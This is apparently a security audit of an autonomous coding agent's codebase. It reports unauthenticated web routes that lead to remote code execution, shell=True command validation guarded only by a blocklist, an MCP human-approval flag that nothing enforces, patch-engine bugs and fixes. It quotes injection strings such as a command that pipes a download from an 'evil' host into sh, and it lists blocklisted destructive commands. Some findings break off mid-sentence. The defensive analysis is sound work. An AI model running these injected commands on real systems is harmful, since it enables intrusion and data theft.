## Executive summary

For an autonomous agent that **writes patches and runs commands**, the dominant
risk theme is **untrusted code execution with weak boundaries**:

1. **Command execution defaults to unsafe.** The legacy validation path runs
   model-/user-supplied commands through `shell=True` guarded only by a small
   regex blocklist, and it is the *default* (`require_safe_validation=False`). A
   safe argv+allowlist subsystem exists but is opt-in.
2. **The web UI has no authentication or CSRF protection**, yet its routes apply
   patches, `git commit`, spawn `npx`, and rewrite `.env`/`docker-compose.yml`.
   With the documented `WEB_HOST=0.0.0.0` pattern this is network-reachable RCE.
3. **The MCP artifact-write server exposes subprocess-bearing tools** that the
   tool registry marked "requires human approval" — the flag is silently ignored,
   so an external client can chain import→validate into code execution.

Secondary themes: **no timeouts** on model/DB calls (one hang stalls the whole
pipeline); **delete-before-insert data loss** in the memory consolidator; a
cluster of **patch-engine correctness bugs** that can corrupt files or patch the
wrong location; and a **dishonest control surface** (toggles that silently revert,
a "DeepSeek" client that never calls DeepSeek, invalid Gemma model IDs).

What's *healthy*: no `eval`/`exec`/`pickle`/`yaml.load` in production code; no
leaked secrets in `.env.example`; the default-off experimental seams
(anti-lessons CONTROL injection, memory-temperature tie-break) were verified to be
genuine no-ops / fail-closed.

## 🔴 CRITICAL (3)

### C1. Legacy validation executes arbitrary commands via `shell=True` (default path)
`core/validator.py:198`, `core/executor.py:300-305`, `core/validation_command.py:10`
`run_validation_command` runs the command with `subprocess.run(..., shell=True)`,
guarded only by a regex blocklist of destructive verbs (`rm -rf`, `format`,
`git reset --hard`…). Anything else passes verbatim: `pytest; curl evil|sh`,
`python -c "__import__('os').system(...)"`, reverse shells, exfiltration. This is
reachable whenever `safe_validation_command is None` and
`require_safe_validation=False` — **the default** in `Executor.run`
(`executor.py:142`) and `apply_patch_plan` (`patch_plan_executor.py:150`). Env is
not scrubbed, so secrets (`GOOGLE_API_KEY`, `DATABASE_URL`) are readable.
**Fix:** make the safe argv+allowlist path the default; replace the blocklist with
a tool allowlist + shell-metachar/command-substitution block.

### C2. No authentication / CSRF on a web UI that performs destructive ops
`web/app.py:80-88`, `web/routes/patch_routes.py:39-133`
No auth, no login, no API key, no `secret_key`, no CSRF (`grep` for
csrf/login/secret_key in `web/` → nothing). Dangerous routes: `/apply_patch` &
`/apply_patch_plan` (write files into a client-supplied `repo_path`),
`/dream/apply` (`git add`/`commit` via subprocess, `web/app.py:929`),
`/mcp/inspector/launch` (spawns `npx`, `web/app.py:1228`),
`/harness/controls/apply-env` & `/compose-apply` (rewrite `.env` / compose).
`WEB_HOST=0.0.0.0` (a documented Docker pattern) exposes all of it to the network.
Even bound to localhost, **no CSRF** means a malicious page the dev visits can
drive-by POST to `127.0.0.1:5000/apply_patch` (form-encoded → submittable
cross-origin). **Fix:** require an auth token (`before_request`); refuse non-loopback
host without a token; add CSRF tokens / Origin checks to all POST routes.

### C3. MCP exposes subprocess tools despite a "requires human approval" flag
`mcp_server/artifact_write.py:40-44,504-564`, `core/tool_registry.py:467-468`,
`core/worker_runs.py:454-463`
`validate_imported_worker_proposal` (registered `requires_human_approval=True,
can_run_subprocess=True`) is exposed over MCP. It takes a client-supplied
`repo_path`, copies it to a temp clone, applies the proposal's `patch_plan.json`,
then runs an **inferred validation command** (`pytest`, `python main.py`,
`g++ … && validation_test.exe`…) that executes code from the applied patch.
`is_tool_allowed` only checks `category ∈ {read, artifact_write}` and never consults
`requires_human_approval` — the flag is advisory metadata that nothing enforces.
Paired with **H9** (`import_worker_run_as_proposal`, also exposed) this is a
two-step import→validate **RCE over MCP**. **Fix:** never expose
`can_run_subprocess`/`requires_human_approval` tools to unattended MCP clients;
have `is_tool_allowed` enforce the flag; add a real operator-approval handshake.

## 🟠 HIGH (~15)

**Patch engine correctness (can corrupt files / patch wrong code):**
- **H1. Non-UTF-8 files silently corrupted.** `patching/patch_engine.py:283-312,436`
  reads via `decode('utf-8','replace')` then rewrites the *whole* file from the
  lossy text on the literal & fuzzy paths — every non-UTF-8 byte becomes U+FFFD,
  destroying untouched regions. Only the AST path (byte-splice) is safe.
- **H2. AST path overwrites a whole function from a fragment target.**
  `patch_engine.py:351-391` takes the whole-node-replace branch when
  `patched_snippet` merely *looks* like a whole node, without checking that
  `target_snippet` matched the node body — can delete unrelated code.
- **H3. Fuzzy matcher applies to the wrong location.** `patch_engine.py:168-221,409`
  ranks indentation-insensitive matches and replaces the *first* top-scoring region
  with no uniqueness gate — short targets silently mutate the wrong occurrence.

**Web (beyond C2):**
- **H4. No CSRF on state-changing POSTs.** `web/routes/patch_routes.py:39`,
  `web/app.py:784` — classic localhost-service drive-by vector.
- **H5. `/apply_patch[_plan]` bypass the harness-mode gate.**
  `patch_routes.py:39-133,333` never call `decide_harness_mode`, so the safety
  system that blocks writes against the harness's own repo is bypassable.
- **H6. Werkzeug debugger `debug=True` in `web/app.py:3599`** `__main__` — a casual
  `python web/app.py` enables the interactive-console RCE surface (proper
  `launch_web` uses `debug=False`).

**MCP (beyond C3):**
- **H7. `import_worker_run_as_proposal` exposed over MCP** (`artifact_write.py:380`)
  feeds the proposals dir consumed by C3 — the import→validate chain.

**Model clients:**
- **H8. The "DeepSeek" client never calls DeepSeek.** `agents/deepseek_client.py:13-67`
  uses `ollama.chat` with a local tag; `DEEPSEEK_API_KEY` is read & warned-about in

  `agents/model_stats.py:128` classifies `gemma-*` as billable Google but the

**Memory / DB:**
- **H12. `consolidate()` deletes notes (committed) before re-inserting the merged

**Core / control surface:**
- **H14. Most of `main()` runs outside any try/except.** `main.py:69-121` — any

## Critical deep-dive (adversarial prove/refute + fix design)

Each critical was investigated by an independent **prove-exploit** agent (build the
end-to-end chain) and a **refute** agent (find a blocker / argue it's overstated),
then a fix-design agent. Result: **one confirmed critical, two downgraded but real.**

### C2 — Web UI no auth/CSRF → CONFIRMED CRITICAL (unanimous)
Both agents agreed; the refuter *could not* knock it down. Verified chain:
unauthenticated `POST /apply_patch` (no auth/secret_key/CSRF/before_request anywhere
in `web/`) → writes attacker-controlled `patched_snippet` into an existing file in a
client-chosen `repo_path` → runs the repo's default validation command
(`python main.py`) via `subprocess.run(shell=True)` ⇒ **unauthenticated RCE**. This
does **not** require C1 — writing code into a file the default validator runs is
enough. `WEB_HOST=0.0.0.0` (the shipped Docker default) makes it network-reachable;
on localhost, missing CSRF allows a drive-by form POST. `decide_harness_mode` and the
`human_approval_dangerous_writes` "invariant" are **never invoked** on `/apply_patch`,
`/apply_patch_plan`, `/dream/apply`, `/mcp/inspector/launch`, `/harness/controls/*`.
*Refuter narrowed two overstated sub-claims (accurate):* apply-env/compose-apply only
flip a fixed **validated registry of flags** in the harness's own files (not arbitrary
content); `/mcp/inspector/launch` is a **2-entry allowlist** of the project's own
scripts (no `npx` arg injection). Neither changes the verdict.
**Fix (effort: small):** one app-wide `@app.before_request` gate in `web/app.py` —
allow GET/HEAD/OPTIONS; require `WEB_AUTH_TOKEN` for mutating methods; when no token
is set, allow mutations only from loopback (preserves the 127.0.0.1 dev UX, kills the
0.0.0.0 RCE); reject cross-origin Origin/Referer (CSRF). Plus `app.secret_key` from
env and `debug=False` in the `__main__` block. One chokepoint covers every blueprint.

### C1 — shell=True validation → real, but HIGH (deploy) / MEDIUM (standalone)
The sink is real and is the default (`require_safe_validation=False` everywhere; the
regex blocklist doesn't stop `&&`/`python -c`/`curl|sh` — the repo's own tests confirm
`&&` chains reach `subprocess.run`). **But** the command *string* is injectable only
by the **local CLI operator** (who already has a shell) — every web route hardcodes
the command via `get_default_validation_command` and never reads it from the request,
and the MCP path uses a no-shell argv runner. So C1 in isolation is a
**defense-in-depth/command-chaining gap**, not an independent remote RCE; the genuine
remote code-execution is the **patch-content** path (that's C2). 
**Fix (effort: medium):** route the automation/agent/web paths through the existing
`SafeValidationCommand`/`parse_safe_validation_command` machinery and flip
`require_safe_validation` defaults to `True` in `Executor.run`, `apply_patch_plan`,
`run_patch_plan_with_artifacts`; gate the legacy shell behind an explicit
`allow_legacy_shell` used only by the interactive CLI; normalize the C++/Rust default
commands (they use `&&`) to build-only argv. **Residual:** does not stop execution of
attacker-influenced *patch content* under the fixed validator — that needs real
sandboxing (`run_in_sandbox`), a separate hardening item.

### C3 — MCP approval flag never enforced → real, but HIGH / MEDIUM
The structural defect is exact and confirmed: `is_tool_allowed` (`core/tool_registry.py:467`)
decides exposure from category only and **never checks `requires_human_approval` /
`can_run_subprocess`** — so the flag on `validate_imported_worker_proposal` is
**provably dead**, and the tool (applies a patch_plan + runs an inferred validation
command) is exposed over MCP with no approval. **But** the "unattended RCE" framing is
overstated: execution happens in a **temp clone** (real repo unchanged), the MCP client
**cannot supply the patch content** (no MCP tool writes a worker_run/patch_plan — it can
only re-trigger already-on-disk artifacts), the validation runs as **shlex/argv
shell=False** against a tool allowlist, and the server is **stdio-only, not started by
default**. So: real enforcement gap, sandbox-bounded → HIGH/MEDIUM, not critical.
**Fix (effort: small):** in `is_tool_allowed`, refuse any `can_run_subprocess` /
`requires_human_approval` tool in the unattended modes (`read_only`, `artifact_write`)
— one central enforcement point; drop `validate_imported_worker_proposal` from
`_EXTRA_WRITE_TOOLS` (belt-and-suspenders); update the registry/exposure tests. The
tool stays available via operator mode + the Flask route.

### Recalibrated priority
1. **C2** (confirmed unauthenticated RCE, small fix) — do first.
2. **C1** (medium fix) + sandbox validation execution to also cover the patch-content
   vector that C2's fix alone doesn't close.
3. **C3** (small fix) — make the dead approval flag enforced.
4. Then the high-severity correctness bugs (patch-engine H1–H3, memory data-loss H12,
   timeouts H10/H13, stuck task_run H14).

## Deferred lenses — completed via targeted inline analysis

The 8 deferred lenses kept exhausting the session limit under the multi-agent
fan-out, so they were covered with a focused grep+read pass over their write/exec
sinks and gates. **The result is largely positive: the entire autonomous /
self-modification surface is report-only or sandbox/temp-clone confined by design.**

- **project-evolution (9 modules) — report-only by design.** Every module
  (`project_evolution_patch_draft/_candidates/_text_draft/_executable_patch_draft/
  _review_gate/_sandbox_validation/_approval`) carries an explicit guardrail
  docstring — *"No model/API calls, patch application, validation execution,
  Docker/subprocess behavior, or lesson mutation occurs here"* — and only writes
  `.agent` JSON/MD artifacts. ✅ No live mutation.
- **self-evolution / dream / sandbox-patch — sandbox-confined.**
  `sandbox_self_evolution_runner` `copytree`s the repo into a sandbox with a
  `SANDBOX_MARKER` file and operates only on the copy; `dream_*` modules are
  report-only (*"No LLM calls, no subprocess, no patch execution"*); graduation
  requires human review by design. Confinement depends on a correct out-of-repo
  `--sandbox-root` (a known operational gotcha).
- **external-queue / worker_runs / worker_result_review — pure `.agent` I/O.**
  `worker_runs` docstring: *"Never modifies the real repo."* Its only apply path
  (`validate_imported_worker_proposal`) runs in a **temp clone** — that's the C3
  chain, already covered.
- **`sleeping_consultant` autonomous "patch_if_safe" — sandbox-confined.** Both
  apply sites copy the repo into a `TemporaryDirectory` and apply there, persisting
  diff/validation artifacts for review; the live repo is never written
  (`core/sleeping_consultant.py:608-620`).
- **report-contracts (telegram / github-pr / n8n / visual) — report-only.**
  Verdicts (`ready_for_human_review`, `blocked`, …) only feed report text; no code
  path turns a verdict into an actual send/merge/auto-merge (consistent with the
  modules' design intent).

**The only live-repo apply paths are** the main pipeline (`core/pipeline.py:717`,
gated by `evaluate_patch_safety` + `decide_harness_mode`) and the **web routes**
(`web/routes/patch_routes.py`) — i.e. **C2 remains *the* live-repo write surface of
concern**, because those routes bypass `decide_harness_mode` and have no auth.

### New finding (deferred lenses)
- **M-EVO. Project-evolution "review gate" / "approval" is advisory-only, never
  enforced.** `approval_status` is only ever *written* as `"pending"` and rendered

  low–medium*: the track is report-only so nothing dangerous hinges on it today, but

**Lighter coverage (low-risk, not exhaustively read):** retrieval-reasoning,
diagnostics-misc-core, benchmarks-harness, and the bulk of the ~76 `scripts/`
wrappers (spot-checked: `run_patch_proposal_queue.py` uses a temp clone +
shlex/allowlist argv, no shell). No new high-risk signals observed in the sinks scanned.

## Remediation roadmap (final)

1. **C2 — close the web RCE first (small).** Add the `@app.before_request` gate
   (auth token; loopback-only mutation when no token; Origin/Referer CSRF check) +
   `secret_key` + `debug=False`. One chokepoint neutralizes every destructive route.
2. **Safe-by-default execution (C1, medium).** Route automation/agent/web validation
   through `SafeValidationCommand`; flip `require_safe_validation` defaults to `True`;
   gate the legacy shell behind explicit `allow_legacy_shell` (interactive CLI only).
   Pair with **sandboxing validation execution** (`run_in_sandbox`) so the
